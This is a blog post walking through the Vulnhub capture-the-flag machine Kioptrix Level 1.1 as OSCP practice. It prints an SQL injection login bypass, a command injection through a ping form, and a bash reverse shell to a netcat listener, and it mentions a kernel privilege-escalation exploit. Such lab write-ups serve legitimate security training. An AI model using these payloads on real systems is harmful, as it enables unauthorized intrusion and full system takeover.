---
layout: post
title: Vulnhub - Kioptrix 1.1 Walkthrough
tags: [Hacking, Vulnhub, CTF]
---
Kioptrix 1.2 is a Boot to Root CTF available [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) on Vulnhub. It's difficulty is rated as Beginner. This VM is the second in the Kioprtix series and the second VM in my OSCP preparation series.  

The VM and my Kali instance are set up with NAT networking, so to discover the IP address of the VM I run netdiscover

![](/img/kioptrix1-2/netdiscover.png)

Once I obtain the IP, I then run a nmap scan and find the following ports: 22, 80, 111, 443, 631 and 3306. 
![](/img/kioptrix1-2/nmap1.png)
![](/img/kioptrix1-2/nmap2.png)

I visit the webpage hosted at port 80 and find a login panel 
![](/img/kioptrix1-2/login.png)

Having noted that there is a MySQL service running on port 3306 I attempted to manually conduct a SQLI attack with some common entires. I successfully get past the login panel by using the following

Username: admin
Password: 1' or '1'='1

I am taken to a page which has a form asking me to enter an IP address to ping. 
![](/img/kioptrix1-2/ping.png)

I enter the IP address of my kali box and another window loads which shows the result of my ping. I note that the output is that of running the ping command on a stardard linux box and I assume that this is very similar to the command injection in DVWA. To confirm this, I enter:

![](/img/kioptrix1-2/ping2.png)

{% highlight bash %}
192.168.5.129 && pwd
{% endhighlight %}

The results show that it accepts and prints my commands and confirms my assumptions
![](/img/kioptrix1-2/ping_result.png)

The next thing I do is to start a netcat listener using:
{% highlight bash %}
nc -lnvp 4444
{% endhighlight %}

I then enter the following into the Ping command form and wait to catch a shell. 
{% highlight bash %}
192.168.5.129 && bash -i >& /dev/tcp/192.168.5.129/4444 0>&1
{% endhighlight %}

![](/img/kioptrix1-2/shell.png)

This spawns a reverse shell as the user apache. I start my enumeration process and identify the kernel version as 2.6.9. I search through exploit-db and find a [Ring 0 Privilege Escalation](https://www.exploit-db.com/exploits/9542/) vulnerability that looks like it will work. I download the code and transfer it to the VM. I review the code and then compile as per the instructions. When I go to execute, I recieve an error 'no job control in this shell'. This means I do not have a full tty shell and I need to upgrade. I upgrade by using: 

{% highlight bash %}
python -c 'import pty; pty.spawn("/bin/sh")'
{% endhighlight %}

![](/img/kioptrix1-2/root.png)

The exploit runs and I confirm that I am root. I hunt around again in the mail folders, but there doesn't seem to be an hidden message in this VM - getting root is enough!
